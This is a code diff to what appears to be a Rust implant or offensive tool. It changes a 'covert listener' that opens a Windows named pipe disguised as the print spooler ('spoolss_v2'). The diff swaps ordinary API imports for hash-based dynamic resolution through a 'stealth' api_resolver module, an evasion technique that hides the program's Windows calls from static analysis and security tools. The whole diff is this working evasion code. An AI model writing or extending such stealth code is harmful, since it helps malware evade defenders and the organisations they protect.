@@ -323,13 +323,31 @@ async fn start_covert_listener() {
     use log::{info, error, debug};
     use std::ptr;
     use std::ffi::CString;
-    use windows_sys::Win32::System::Pipes::{
-        CreateNamedPipeA, ConnectNamedPipe
-    };
-    use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, GetLastError};
+    use std::ffi::c_void;
+    // use windows_sys (REMOVED: Using Dynamic API)
     use std::fs::File;
     use std::os::windows::io::FromRawHandle;
     use std::io::{Read, Write};
+    use crate::stealth::windows::api_resolver::{self, resolve_api, 
+        HASH_KERNEL32, HASH_CREATE_NAMED_PIPE_A, HASH_CONNECT_NAMED_PIPE, 
+        HASH_CLOSE_HANDLE, HASH_GET_LAST_ERROR};
+
+    // Constants (formerly from windows-sys)
+    const INVALID_HANDLE_VALUE: isize = -1;
+    const PIPE_ACCESS_DUPLEX: u32 = 3;
+    const PIPE_TYPE_BYTE: u32 = 0;
+    const PIPE_READMODE_BYTE: u32 = 0;
+    const PIPE_WAIT: u32 = 0;
+    const PIPE_UNLIMITED_INSTANCES: u32 = 255;
+    const ERROR_PIPE_CONNECTED: u32 = 535;
+
+    // Function Types
+    type FnCreateNamedPipeA = unsafe extern "system" fn(
+        *const u8, u32, u32, u32, u32, u32, u32, *const c_void
+    ) -> isize;
+    type FnConnectNamedPipe = unsafe extern "system" fn(isize, *mut c_void) -> i32;
+    type FnCloseHandle = unsafe extern "system" fn(isize) -> i32;
+    type FnGetLastError = unsafe extern "system" fn() -> u32;
 
     const PIPE_NAME: &str = "\\\\.\\pipe\\spoolss_v2";
     info!("[Discovery] Starting Windows Named Pipe Listener: {}", PIPE_NAME);
@@ -338,11 +356,22 @@ async fn start_covert_listener() {
         // Run blocking CreateNamedPipe & ConnectNamedPipe in thread pool
         let result = smol::unblock(|| unsafe {
             let name_c = CString::new(PIPE_NAME).unwrap();
-            let handle = CreateNamedPipeA(
+            
+            // Resolve APIs dynamically
+            let create_pipe: FnCreateNamedPipeA = resolve_api(HASH_KERNEL32, HASH_CREATE_NAMED_PIPE_A)
+                .ok_or("Failed to resolve CreateNamedPipeA".to_string())?;
+            let connect_pipe: FnConnectNamedPipe = resolve_api(HASH_KERNEL32, HASH_CONNECT_NAMED_PIPE)
+                .ok_or("Failed to resolve ConnectNamedPipe".to_string())?;
+            let close_handle: FnCloseHandle = resolve_api(HASH_KERNEL32, HASH_CLOSE_HANDLE)
+                .ok_or("Failed to resolve CloseHandle".to_string())?;
+            let get_last_error: FnGetLastError = resolve_api(HASH_KERNEL32, HASH_GET_LAST_ERROR)
+                .ok_or("Failed to resolve GetLastError".to_string())?;
+
+            let handle = create_pipe(
                 name_c.as_ptr() as *const u8,
-                3, // PIPE_ACCESS_DUPLEX
-                0, // PIPE_TYPE_BYTE (0) | PIPE_READMODE_BYTE (0) | PIPE_WAIT (0)
-                255, // PIPE_UNLIMITED_INSTANCES
+                PIPE_ACCESS_DUPLEX,
+                PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+                PIPE_UNLIMITED_INSTANCES,
                 4096, // Out buffer
                 4096, // In buffer
                 0,    // Default timeout
@@ -350,21 +379,21 @@ async fn start_covert_listener() {
             );
 
             if handle == INVALID_HANDLE_VALUE {
-                return Err(format!("CreateNamedPipe failed: {}", GetLastError()));
+                return Err(format!("CreateNamedPipe failed: {}", get_last_error()));
             }
 
             // Wait for client connection (Scanning node)
-            let connected = ConnectNamedPipe(handle, ptr::null_mut());
+            let connected = connect_pipe(handle, ptr::null_mut());
             
             // If ConnectNamedPipe fails, it might be that client already connected
             // returns 0 on failure.
             if connected == 0 {
-                let err = GetLastError();
+                let err = get_last_error();
                 // ERROR_PIPE_CONNECTED = 535
-                if err != 535 {
+                if err != ERROR_PIPE_CONNECTED {
                     // unexpected error
                     // Close handle to free instance
-                    windows_sys::Win32::Foundation::CloseHandle(handle);
+                    close_handle(handle);
                     return Err(format!("ConnectNamedPipe failed: {}", err));
                 }
             }
